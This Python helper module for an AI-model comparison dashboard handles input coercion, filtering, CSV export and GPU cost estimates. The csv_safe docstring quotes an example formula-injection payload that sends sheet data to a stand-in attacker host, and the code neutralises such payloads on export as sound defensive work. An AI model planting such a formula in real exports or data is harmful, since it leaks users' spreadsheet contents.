"""Pure, dash-free helpers shared by app.py, static_api.py, build_static.py.
Imports only stdlib + pandas so this module loads under Pyodide."""
import math
import re
import pandas as pd

from components.charts.constants import canonical_provider


def coerce_number(value, default: float, minimum: float | None = None) -> float:
    """Read a number the user typed, distinguishing 0 from "left blank".

    Every numeric input used `float(value or DEFAULT)`, and 0 is falsy — so
    typing 0 silently produced the default. A 0-token budget priced 1M tokens,
    0 GB of VRAM selected a whole GPU's worth of "models that fit", and the
    Agent Stack recommended a 21 GB model for a stated 0 GB.

    Only None, "" or an unparseable value means "not given". `minimum` clamps
    hostile input: the Budget box's HTML `min` attribute is a validation hint,
    not a guard, so a negative volume reached the cost model and its ascending
    sort put the most expensive model under a callout reading CHEAPEST.

    NaN and infinity count as unparseable. They must take the `default` branch,
    not the clamp: `max(0.0, nan)` is `nan` — NaN compares False against
    everything — so a NaN bandwidth used to become 0 GB/s and every model on the
    Local tab read 0 tok/s, defeating the very default it was paired with. And
    `max(1, inf)` is `inf`, which raises OverflowError on the int() that follows,
    or serialises as the literal `Infinity`, which JSON.parse rejects.

    The blank test sits inside the guard because it is not total: `pd.NA == ""`
    returns NA, and bool(NA) raises.
    """
    try:
        out = float(default) if value is None or value == "" else float(value)
    except (TypeError, ValueError):
        out = float(default)
    if not math.isfinite(out):
        out = float(default)
    return out if minimum is None else max(float(minimum), out)


def apply_filters(df, providers, min_quality, search: str = "",
                  effort: str | None = None, weights: str | None = None) -> pd.DataFrame:
    """Global PROVIDER / MIN SCORE / SEARCH filter, shared by both renderings.

    `providers` is falsy-means-all here, and that is deliberate — this backs a
    multi-select whose placeholder literally reads "All providers", so an empty
    box is the unfiltered state. The Agent Stack's `select_stack` uses the
    opposite rule (`[]` means none) because it backs *checkboxes*, where every
    box unticked is an explicit choice. Two controls, two idioms; the rule is
    pinned by tests on both sides so the asymmetry stays deliberate.

    Names are canonicalised on both sides of the comparison so a retired
    spelling still selects: an `?p=xAI` link shared before Artificial Analysis
    renamed the provider matched zero rows and silently rendered the entire
    catalogue.

    `effort` selects WHICH reasoning-effort variant represents each model; it
    does not filter rows out. Default None keeps every variant, which is what
    every caller saw before the control existed, so an untouched dashboard shows
    exactly what it always did. See components.charts.constants.select_effort.

    `weights` is the WEIGHTS control: "open" keeps open-weights rows, "closed"
    the rest, anything else (default "") keeps both. It runs AFTER the effort
    pick, so a family's representative tier is chosen first and then kept or
    dropped whole. Rows are classified by data/open_weights.py (AA's flag, else
    the name registry); a frame that has not been annotated is annotated here.
    """
    filtered = df.copy()
    if effort:
        from components.charts.constants import select_effort
        filtered = select_effort(filtered, None if effort == "best" else effort)
    if weights:
        from data.open_weights import filter_weights
        filtered = filter_weights(filtered, weights)
    if providers:
        wanted = {canonical_provider(str(p)) for p in providers}
        filtered = filtered[
            filtered["provider"].astype(str).map(canonical_provider).isin(wanted)
        ]
    if min_quality and float(min_quality) > 0:
        filtered = filtered[filtered["quality"] >= float(min_quality)]
    if search and search.strip():
        # Escape user input so characters like (, [, * are treated as
        # plain text rather than regex metacharacters.
        pat = re.escape(search.strip())
        mask = (
            filtered["model"].str.contains(pat, case=False, na=False) |
            filtered["provider"].str.contains(pat, case=False, na=False)
        )
        filtered = filtered[mask]
    return filtered


def task_axis_frames(df, providers, min_quality, search: str = "",
                     effort: str | None = None, weights: str | None = None):
    """Overview's Cost / task view filters the catalogue twice; both renderings
    call this so they cannot drift.

    Returns (costed, every):
      costed — only rows AA published a cost per task for, THEN filtered, so
               EFFORT picks the nearest tier AA has costed. Filtering after the
               selection dropped a family whose chosen tier was uncosted while a
               sibling tier was costed (gpt-oss-120b at Low: High costed, Low
               not), and the title then said AA had no cost for it.
      every  — the same filters on the whole catalogue: the families the title
               counts as on screen.
    """
    from data.task_cost import has_task_cost
    costed = apply_filters(df[has_task_cost(df)], providers, min_quality,
                           search, effort, weights)
    every = apply_filters(df, providers, min_quality, search, effort, weights)
    return costed, every


COMPARE_MAX = 5

# Characters that make a spreadsheet treat a cell as a formula rather than text.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(df):
    """Neutralise leading formula characters in text cells.

    `to_csv` quotes for delimiters, and quoting does not stop Excel or Sheets
    evaluating a cell that begins with `=`. The export is handed to the browser
    as `ai_frontier_export.csv` — a filename that invites a spreadsheet — so a
    scraped model name of `=IMPORTXML("https://attacker/?"&A1,"//a")` would run
    on open and exfiltrate the sheet, with nothing on screen to suggest the name
    was a formula.

    Applied on export AND on the way into data/raw/*.csv, which the bot commits
    hourly. The feed is clean today (0 cells starting `= + - @ \\t \\r`); this is
    a choke point, not a reaction.
    """
    def _clean(v):
        if not isinstance(v, str):
            return v
        # Collapse embedded newlines and tabs first. A prefix does not help if
        # the cell can end the record: a \r inside a quoted field still starts a
        # new row in some readers, and the continuation line is then unprefixed.
        v = v.replace("\r\n", " ").replace("\r", " ").replace("\n", " ").replace("\t", " ")
        return "'" + v if v[:1] in _FORMULA_LEAD else v

    out = df.copy()
    for col in out.columns:
        if out[col].dtype == object:
            out[col] = out[col].map(_clean)
    return out

# The v4-era fixed ladder, kept only for a caller that cannot say the peak.
_QUALITY_LADDER = [0, 10, 15, 20, 25, 30, 35, 40, 45, 50]


def quality_options(p75: float | None = None, p90: float | None = None,
                    peak: float | None = None) -> list[dict]:
    """MIN SCORE options, including the exact percentiles the presets set.

    One value had four incompatible representations. The presets wrote 42.1 and
    52.7 into a dropdown whose options were a round ladder, so:
      - Dash's control went visually blank (no matching option),
      - the static site snapped 52.7 down to 50, making "Top 10%" return 15.5%
        of the catalogue under a label that is a precise numeric claim,
      - `?q=42.1` hit `int("42.1")`, raised, was swallowed, and became 0 — the
        filter silently dropped, so a shared "Top 25%" link showed 11 models as
        the top quartile when only 8 qualified.

    Carrying the percentiles as real options makes the control able to hold what
    the buttons set, and labels them so the number is not a mystery.

    The round steps track the catalogue's current `peak` (data/quality_scale
    .ladder): every 5 points below it. The fixed 0..50 ladder was set on index
    v4 and is the fallback when no peak is given.
    """
    from data.quality_scale import ladder
    steps = ladder(peak) if peak else _QUALITY_LADDER
    entries = {float(v): f"≥ {v:g}" for v in steps}
    for value, note in ((p75, "top 25%"), (p90, "top 10%")):
        if value is not None and float(value) > 0:
            entries[float(value)] = f"≥ {float(value):g}  ·  {note}"
    return [{"label": entries[v], "value": v} for v in sorted(entries)]

# Tabs that read none of PROVIDER / MIN SCORE / SEARCH. The global filter bar is
# rendered outside the tab container in both renderings, so it stayed visible
# and live over content it did not touch: on ?tab=image&p=Anthropic&q=45 the bar
# read "Anthropic · ≥ 45" above a chart plotting 72 models from a dozen other
# providers.
TABS_WITHOUT_GLOBAL_FILTERS = ("recommend", "local", "image", "video", "economics")

# What ↓CSV should hand you on each tab. Exporting the hosted-LLM catalogue from
# the Image Gen tab produced a file with the LLM header and seven text models —
# a different dataset from the one on screen.
_TAB_EXPORTS = {
    "local": ("ai_frontier_local_models.csv", "local"),
    "image": ("ai_frontier_image_models.csv", "image"),
    "video": ("ai_frontier_video_models.csv", "video"),
    "economics": ("ai_frontier_serving_cost.csv", "economics"),
}

# Economics exports per VIEW (econ_args[0]); F and G add their views. Every
# view the VIEW radio offers must be here: a view missing from it used to fall
# back to Serve, so ↓CSV on Labs downloaded the serving-cost table.
ECON_EXPORT_FILENAMES = {"serve": "ai_frontier_serving_cost.csv",
                         "compute": "ai_frontier_gpu_tco.csv",
                         "labs": "ai_frontier_labs.csv"}


# The positional order of update_local's hardware arguments. docs/app.js builds
# ONE list in this order (localArgs) and sends it to both update_local and the
# Run Local ↓CSV, so the export can never describe different hardware from the
# chart beside it.
LOCAL_ARG_NAMES = ("vram_per_gpu", "num_gpus", "quant", "bandwidth_gbps",
                   "hw_type", "tags", "ctx_tokens", "fp16_tflops", "gpu_rate")


def gpu_hw_meta(gpu_name) -> dict | None:
    """The hardware a GPU preset stands for, or None for an unknown name.

    fp16_tflops travels with the other three: a dict without it makes the
    published site compute bandwidth-only speeds while Dash computes roofline
    speeds for the same card.
    """
    from data.local_models import GPU_BY_NAME, tflops_for_gpu

    g = GPU_BY_NAME.get(gpu_name or "")
    if not g:
        return None
    # $/GPU-hr presets for the Run Local readout: SemiAnalysis InferenceX's
    # owning and renting marks where it prices this part (data/serving_cost
    # .gpu_rates), None for every card it does not (consumer GPUs: your own
    # hardware has no published hourly rate).
    from data.serving_cost import gpu_rates
    rate = gpu_rates().get(gpu_name)
    return {"vram_gb": g["vram_gb"], "bandwidth_gbps": g["bandwidth_gbps"],
            "hw_type": g["hw_type"], "fp16_tflops": tflops_for_gpu(gpu_name),
            "rate_own": rate["own"] if rate else None,
            "rate_rent": rate["rent"] if rate else None,
            "rate_source": rate["source"] if rate else None,
            "rate_date": rate["date"] if rate else None}


def gpu_preset_options() -> list[dict]:
    """GPU preset options with each preset's hardware riding along.

    The browser used to resolve a preset with a second worker call
    (local_hw_for_gpu) on every change. That call is a dictionary lookup, but
    the worker is single-threaded, so it queued behind whatever update_local
    was running — 1.2 s and more — while the VRAM box and the bandwidth the
    next chart used still belonged to the previous card. Shipping the table
    once at boot lets the change handler resolve it in the same tick.
    """
    from data.local_models import get_gpu_options, memory_note

    return [{**o, **(gpu_hw_meta(o["value"]) or {}), "memory_note": memory_note(o["value"])}
            for o in get_gpu_options()]


def local_frame(vram_per_gpu=None, num_gpus=None, quant=None, bandwidth_gbps=None,
                hw_type=None, tags=None, ctx_tokens=None, fp16_tflops=None,
                gpu_rate=None):
    """(local_df, total_vram_gb, ctx_tokens, quant) for the Run Local controls.

    One place turns the raw control values into a frame, shared by the chart
    (static_api.update_local) and the ↓CSV. The export used a bare
    get_local_df(), so its "fits" and speed columns described the default 32 GB
    card at Q4 whatever hardware was on screen.
    """
    from data.local_models import (
        get_local_df, DEFAULT_VRAM_GB, DEFAULT_GPU_COUNT, DEFAULT_BANDWIDTH_GBPS,
        DEFAULT_CONTEXT_TOKENS, effective_bandwidth,
    )

    gpu_count = int(coerce_number(num_gpus, default=DEFAULT_GPU_COUNT, minimum=1))
    vram_gb = coerce_number(vram_per_gpu, default=DEFAULT_VRAM_GB, minimum=0.0) * gpu_count
    bw = coerce_number(bandwidth_gbps, default=DEFAULT_BANDWIDTH_GBPS, minimum=0.0)
    ctx = int(coerce_number(ctx_tokens, default=DEFAULT_CONTEXT_TOKENS, minimum=0))
    quant = quant or "Q4"
    ldf = get_local_df(
        quant=quant,
        vram_gb=vram_gb,
        bandwidth_gbps=effective_bandwidth(bw, gpu_count),
        hw_type=hw_type or "nvidia",
        tags=list(tags) if tags else None,
        ctx_tokens=ctx,
        # None stays None: decode_roofline drops the compute roof and reports
        # bound="memory?" rather than implying a ceiling was checked.
        fp16_tflops=fp16_tflops,
        gpu_count=gpu_count,
    )
    # $/GPU-HR -> $ per 1M output tokens at the throughput this tab shows (its
    # layer-split aggregate at the 10 tok/s floor), full use. NaN, never 0,
    # where there is no rate or no throughput. Economics › Serve is the
    # calibrated datacenter figure; this one is the tab's own physics.
    from data.serving_cost import local_usd_per_m
    rate = coerce_number(gpu_rate, default=float("nan"))
    rate = rate if math.isfinite(rate) and rate > 0 else float("nan")
    ldf = ldf.copy()
    ldf["gpu_rate_usd_hr"] = rate
    ldf["gpu_count"] = gpu_count
    ldf["usd_per_m_out"] = [local_usd_per_m(rate, gpu_count, t)
                            for t in ldf.get("total_tps", pd.Series(dtype=float))]
    return ldf, vram_gb, ctx, quant


def with_local_rent_cost(local_df, gpu_preset, gpu_count):
    """Agent Stack's local picks are not free on a datacenter GPU: price them at
    SemiAnalysis InferenceX's renting rate for the preset (full use, the tab's
    own max concurrent throughput, `sessions` streams). Only the seven cards
    InferenceX prices have a rate; every other card gets NaN, never 0.
    Shared by app.py and static_api so both renderings price the same card."""
    from data.serving_cost import gpu_rates, local_usd_per_m
    rate = gpu_rates().get(gpu_preset or "")
    rent = rate["rent"] if rate else float("nan")
    out = local_df.copy()
    out["usd_per_m_out"] = [local_usd_per_m(rent, gpu_count, t)
                            for t in out.get("total_tps", pd.Series(dtype=float))]
    return out


def _local_kwargs(local_args) -> dict:
    """Accept the browser's positional list or a keyword dict (Dash)."""
    if not local_args:
        return {}
    if isinstance(local_args, dict):
        return {k: v for k, v in local_args.items() if k in LOCAL_ARG_NAMES}
    return dict(zip(LOCAL_ARG_NAMES, list(local_args)))


def export_frame_for_tab(tab, full_df, providers, min_quality, search,
                         effort=None, local_args=None, mix=None, weights=None,
                         econ_args=None):
    """(DataFrame, filename) for the dataset the given tab is showing.

    The three non-LLM tabs export their own catalogue, because the global
    filters they would otherwise be filtered by are hidden there. Run Local is
    computed for `local_args` — the hardware the user picked, in
    LOCAL_ARG_NAMES order or as a dict — and the LLM tabs honour EFFORT, which
    used to be dropped: 113 rows on screen exported as 195.

    `mix` (data/workload_mix) re-prices the LLM tabs' export the way the screen
    is priced. At any non-default mix the file says so itself: `price_basis`
    names the mix, `price_list_blend` keeps the dashboard's list blend and
    `cache_price_filled` marks the 10%-of-input fill-ins.
    """
    name, kind = _TAB_EXPORTS.get(tab or "", ("ai_frontier_export.csv", "llm"))
    if kind == "economics":
        return econ_export(econ_args, full_df)
    if kind == "local":
        return local_frame(**_local_kwargs(local_args))[0], name
    if kind == "image":
        from data.image_models import get_image_df
        return get_image_df(), name
    if kind == "video":
        # The RAW catalogue, not the projected view: both arenas, both prices,
        # every per-category Elo, and the superseded builds the tab hides behind
        # is_current. The export is where someone checks the dashboard's work,
        # so it must carry more than the screen does, not less.
        from data.video_models import get_video_df, load_raw
        raw = load_raw()
        return (get_video_df() if raw is None or raw.empty else raw), name
    if tab in TABS_WITHOUT_GLOBAL_FILTERS:
        # Agent Stack: ↓CSV stays on screen there, but the filters beside it
        # are hidden, so applying them would shape the file by values the user
        # cannot see — a leftover "Anthropic · ≥ 45" from another tab. Export
        # the whole hosted catalogue the stack picks from.
        return apply_filters(full_df, None, 0, ""), name
    from data.workload_mix import apply_mix, resolve_mix
    m = resolve_mix(mix)
    frame = apply_filters(apply_mix(full_df, m), providers, min_quality, search or "",
                          effort, weights)
    if not m.is_default:
        frame = frame.copy()
        frame.insert(frame.columns.get_loc("price") + 1, "price_basis", m.long)
    return frame, name


def econ_view_args(econ_args) -> tuple[str, list]:
    """econ_args = [view, *view_args] from the browser (or None) -> (view, args).
    An unknown view is Serve, the default: the list is user input."""
    args = list(econ_args) if isinstance(econ_args, (list, tuple)) else []
    view = args[0] if args and args[0] in ECON_EXPORT_FILENAMES else "serve"
    return view, args[1:] if args and args[0] == view else []


def econ_export(econ_args, hosted=None):
    """(DataFrame, filename) for the Economics view on screen."""
    view, rest = econ_view_args(econ_args)
    name = ECON_EXPORT_FILENAMES[view]
    if view == "serve":
        from data.serving_cost import serving_frame
        gpu, basis, util = (list(rest) + [None, None, None])[:3]
        hosted = hosted if hosted is not None and len(hosted) else None
        return serving_frame(gpu, basis, util, hosted), name
    if view == "compute":
        # The TCO table (every GPU, every input with its source) and the
        # selected GPU's ladder, for the same 10 arguments update_econ_compute
        # takes: gpu, preset, util, life, rate, capex, kw, pue, kwh, colo.
        from data import gpu_tco
        args = (list(rest) + [None] * 10)[:10]
        return gpu_tco.export_frame(gpu_tco.compute(*args)), name
    if view == "labs":
        # Everything the Labs view draws, one `chart` column naming which: the
        # lab ledger (every curated row, excluded ones included, with source,
        # badge and status), the commitment multiples, Epoch AI's run-rate and
        # token rows (a `credit` column on each), then the three open-vs-closed
        # figures' rows (a build-time slice: their score history never ships).
        # Labs has no controls, so no arguments.
        from data.econ_common import read_derived
        from data.open_gap import DERIVED_EXPORT, export_csv_text
        from data.lab_economics import ledger_export_frame
        frames = [f for f in (ledger_export_frame(),
                              read_derived(DERIVED_EXPORT, export_csv_text)) if not f.empty]
        return (pd.concat(frames, ignore_index=True, sort=False) if frames
                else pd.DataFrame()), name
    return pd.DataFrame(), name


def cap_compare_selection(selected_models, filtered_df, triggered=None) -> list[str]:
    """The Compare tab's selection, pruned to what still fits — never discarded.

    Two bugs, one cause: the selection was *replaced* with the diverse-5
    defaults rather than filtered.

    (a) Any global filter change reset it, even for models that still passed.
        A curated three-model comparison vanished on one click of "Top 25%"
        while every one of the three still cleared the new floor, and clearing
        the filter did not bring them back.
    (b) On the static site every tab switch routed through the same path, so
        going to Table and back replaced the selection too. Dash has no `tabs`
        input on this callback and never did it — pure drift, which is why
        `triggered` must distinguish a real filter change from a re-render.

    The cap evicts the OLDEST pick, not the newest: `[:5]` threw away the model
    the user had just clicked, which reads as the click doing nothing.
    """
    available = set(filtered_df["model"]) if filtered_df is not None and len(filtered_df) else set()
    kept = [m for m in (selected_models or []) if m in available]

    if triggered in ("filter-provider", "filter-quality", "model-search"):
        # A real filter change: keep whatever still qualifies, and only fall
        # back to the defaults when the filter has excluded everything.
        return kept[-COMPARE_MAX:] if kept else compute_diverse5(filtered_df)

    if triggered == "radar-model-select" and not (selected_models or []):
        # The user emptied the control themselves. Returning the defaults here
        # charted five models while the raw-values table beneath went blank —
        # the chart and the table disagreeing about what was being compared,
        # with the <select> visibly empty. An explicit clear stays cleared.
        return []

    if not kept:
        # No selection yet (first paint, or a re-render with nothing chosen).
        return compute_diverse5(filtered_df)
    return kept[-COMPARE_MAX:]


def compute_diverse5(dataframe: pd.DataFrame) -> list[str]:
    """Pick 5 diverse models spanning quality, value, speed, and budget tiers.

    Five DIFFERENT model families: the pick skipped only an identical name, so
    under "All variants" the defaults compared Claude Opus 5.5 (Max) with
    Claude Opus 5.5 (Xhigh) — one model at one price, twice. Each family is
    represented by its best-scoring tier.

    The tier floors are quantiles of the frame's family scores
    (data/quality_scale), not v4-era literals (35 / 40 / 50 / 40-70), so a
    rescale of the index moves them with the scores.
    """
    from components.charts.constants import base_model_name, dedupe_to_best_variant
    from data.quality_scale import floor as q_floor

    valid = dataframe[(dataframe["quality"] > 0) & (dataframe["price"] > 0)].copy()
    if valid.empty:
        return []
    valid = dedupe_to_best_variant(valid)
    picks: list = []
    families: set = set()

    def _add(rows):
        for _, row in rows.iterrows():
            fam = base_model_name(str(row["model"]))
            if fam not in families:
                picks.append(row["model"])
                families.add(fam)
                return

    f_value, f_fast = q_floor(valid, "compare_value"), q_floor(valid, "compare_fast")
    f_strong = q_floor(valid, "compare_strong")
    f_lo, f_hi = q_floor(valid, "compare_mid_lo"), q_floor(valid, "compare_mid_hi")
    valid["_val"] = valid["quality"] / valid["price"]

    def _by(frame, col, asc):
        return frame.sort_values([col, "model"], ascending=[asc, True], kind="mergesort")

    # 1. Best intelligence
    _add(_by(valid, "quality", False))
    # 2. Best value above the 30th percentile, so weak-but-cheap models don't
    #    monopolise the "value" pick.
    v = valid[valid["quality"] >= f_value]
    _add(_by(v if not v.empty else valid, "_val", False))
    # 3. Fastest in the upper half
    fast = valid[(valid["speed"] > 0) & (valid["quality"] >= f_fast)]
    _add(_by(fast if not fast.empty else valid, "speed", False))
    # 4. Cheapest in the top fifth
    cheap = valid[valid["quality"] >= f_strong]
    _add(_by(cheap if not cheap.empty else valid, "price", True))
    # 5. Mid-tier: best between the 50th and 95th percentiles
    mid = valid[(valid["quality"] >= f_lo) & (valid["quality"] <= f_hi)]
    _add(_by(mid if not mid.empty else valid, "quality", False))
    # Fewer than five distinct families qualified for the five roles: fill
    # from the top so the chart still compares five where five exist.
    for _ in range(5):
        if len(picks) >= 5:
            break
        before = len(picks)
        _add(_by(valid, "quality", False))
        if len(picks) == before:
            break

    return picks[:5]


def ctx_to_k(c) -> float | None:
    """Convert context string ('400k', '1m', '128k') to numeric thousands for sorting."""
    if not c:
        return None
    s = str(c).strip().lower()
    try:
        if s.endswith('m'):
            return float(s[:-1]) * 1000
        if s.endswith('k'):
            return float(s[:-1])
        return float(s) / 1000
    except ValueError:
        return None


def quality_label(pct: float) -> str:
    """pct is quality normalised to 0–100 relative to the dataset max."""
    if pct >= 90: return "Exceptional"
    if pct >= 75: return "Strong"
    if pct >= 55: return "Capable"
    if pct >= 35: return "Average"
    return "Limited"


def provider_options(dataframe: pd.DataFrame) -> list:
    return [{"label": p, "value": p} for p in sorted(dataframe["provider"].unique())]


def model_options(dataframe: pd.DataFrame) -> list:
    # Stable secondary key on the name: ties in quality are common (AA rounds to
    # 0.1), and an unordered tie makes the dropdown reshuffle between the Dash
    # app and the Pyodide build, which run different pandas sort defaults.
    top = dataframe[dataframe["quality"] > 0].sort_values(
        ["quality", "model"], ascending=[False, True], kind="mergesort")
    return [{"label": f"{r['model']} ({r['provider']})", "value": r["model"]}
            for _, r in top.iterrows()]


def ranking_frame(df):
    """The hosted catalogue plus the open-weight models nobody sells.

    One definition, called by app.py, static_api.py and build_static.py, because
    a leaderboard that differs between the Dash app and the published site is
    the drift this module exists to prevent.

    Only the RANKINGS view uses this. Overview, Landscape and the rest stay on
    the hosted frame: their axes are price and speed, and these rows have
    neither. See data.local_models.unhosted_ranking_rows for why that is a
    property of the data rather than a gap in it.
    """
    import pandas as pd

    try:
        from data.local_models import unhosted_ranking_rows
        extra = unhosted_ranking_rows(set(df["model"].astype(str)))
    except Exception:
        return df                      # a ranking is better than an exception
    if extra is None or extra.empty:
        return df
    merged = pd.concat([df, extra], ignore_index=True)
    if "self_host" in merged.columns:
        # .eq(True) rather than .fillna(False).astype(bool): concat leaves the
        # hosted rows NaN in an object column, and fillna+astype on that emits a
        # pandas downcasting FutureWarning. NaN.eq(True) is already False.
        merged["self_host"] = merged["self_host"].eq(True)
    # The unhosted rows come from AA's open-weights catalogue, so they are open
    # by AA's own classification; the hosted rows keep what they were given.
    if "open_weights" in df.columns:
        extra_rows = merged.index >= len(df)
        merged["open_weights"] = merged["open_weights"].where(~extra_rows, True).eq(True)
        merged["weights_source"] = merged["weights_source"].where(~extra_rows, "aa")
    return merged


def weights_options() -> list[dict]:
    """Options for the WEIGHTS control (data/open_weights.WEIGHTS_OPTIONS)."""
    from data.open_weights import weights_options as _opts
    return _opts()


def effort_options() -> list[dict]:
    """Options for the EFFORT control, shipped in the manifest.

    "All variants" is first and is the default, so the dashboard an untouched
    visitor sees is the one it has always been — the Table in particular
    promises "every tracked model" and must not quietly collapse. Choosing
    anything else selects one row per model.
    """
    from components.charts.constants import EFFORT_LEVELS

    return (
        [{"label": "All variants", "value": ""},
         {"label": "Best available", "value": "best"}]
        + [{"label": label, "value": slug} for slug, label in EFFORT_LEVELS]
    )


def index_label(v) -> str:
    """One of AA's sibling indices (Coding / Agentic / Omniscience), or "not scored".

    Added with AA's 2026-09 intelligence overhaul. AA publishes Coding for 144
    of our 198 hosted models and Agentic for 107, so the absent case is the
    common one and has to read as absent. "0.0" would be wrong twice over: it
    is a real score on these scales, and AA-Omniscience is negative for most of
    the catalogue (live range -88.6 to +43.7) because it penalises
    hallucination — so a fabricated 0 would rank an unscored model above a
    genuinely bad one.

    Lives here because app.py (Dash) and static_api.py (the Pyodide bridge that
    serves the published site) must say the same thing about the same model,
    and this module is the one both already import and build_static vendors.
    """
    import pandas as _pd

    if v is None:
        return "not scored"
    try:
        if _pd.isna(v):
            return "not scored"
        return f"{float(v):.1f}"
    except (TypeError, ValueError):
        return "not scored"


def standing_note(quality, catalogue: pd.DataFrame) -> str:
    """Where a score stands, for the detail panel: "Scores above 85% of the 34
    model families".

    It read "Top {100 - pct}% of all models", with pct counted over every row
    (unscored ones too) — so a score-12 model was "Top 93%", a percentile
    phrased as praise. Now the share of model FAMILIES (each at its best tier,
    as every chart counts them) that score strictly lower, said as exactly
    that."""
    from data.quality_scale import family_scores

    scores = family_scores(catalogue)
    try:
        q = float(quality)
    except (TypeError, ValueError):
        return ""
    if scores.empty or not math.isfinite(q):
        return ""
    n = len(scores)
    below = int((scores < q).sum())
    if q >= float(scores.max()):
        return f"Highest score among the {n} model families"
    return f"Scores above {round(below / n * 100)}% of the {n} model families"


def context_label(value) -> str:
    """"1M tokens" / "128K tokens" for a context string ("1m", "128k", ...).
    A bare "1m" in the detail panel read as one minute."""
    k = ctx_to_k(value)
    if k is None or not math.isfinite(k) or k <= 0:
        return "N/A"
    if k >= 1000:
        m = k / 1000
        return f"{m:g}M tokens" if abs(m - round(m, 1)) < 1e-9 else f"{m:.1f}M tokens"
    return f"{k:g}K tokens"


def scored_indices(row) -> list[tuple[str, str]]:
    """(label, value) for the sibling indices AA actually published for this
    model. Most models have none of Coding / Agentic, and three "not scored"
    rows on every panel were noise; an absent index is now simply absent."""
    out = []
    for label, col in (("Coding", "coding"), ("Agentic", "agentic"),
                       ("Omniscience", "omniscience")):
        text = index_label(row.get(col))
        if text != "not scored":
            out.append((label, text))
    return out
